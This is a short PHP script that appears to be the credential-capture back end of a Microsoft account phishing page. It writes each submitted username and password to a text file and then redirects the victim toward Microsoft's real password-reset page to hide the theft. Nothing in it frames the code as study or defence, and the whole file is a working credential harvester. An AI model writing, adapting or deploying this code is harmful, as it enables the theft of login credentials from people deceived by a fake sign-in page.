<?php

file_put_contents("usernames.txt", "Microsoft Username: " . $_POST['loginfmt'] . "\nPassword: " . $_POST['passwd'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://account.live.com/ResetPassword.aspx
header("Location: $url");
exit();
?>